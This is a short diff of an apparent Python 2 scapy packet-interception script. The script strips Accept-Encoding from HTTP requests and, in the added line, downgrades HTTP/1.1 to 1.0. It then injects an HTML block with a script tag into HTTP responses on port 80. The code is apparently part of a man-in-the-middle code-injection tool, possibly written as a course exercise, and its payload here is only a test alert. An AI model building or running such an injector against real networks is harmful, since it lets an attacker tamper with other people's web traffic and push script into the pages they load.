@@ -19,6 +19,7 @@ def process_packet(packet):
             print "[+] Request"
 	    # We remove the Accept-Encoding so we get the html in plain text format.
 	    load = re.sub("Accept-Encoding:.*?\\r\\n", "",load)
+	    load = load.replace("HTTP/1.1", "HTTP/1.0")# This is to avoid 1.1 version's chunk responces that can cause issues.
         elif scapy_packet[scapy.TCP].sport == 80:
             print "[+] Responce"
             injection_code = "<div><h1>This code is injected<h1></div></p><script>alert('test');</script></body>"
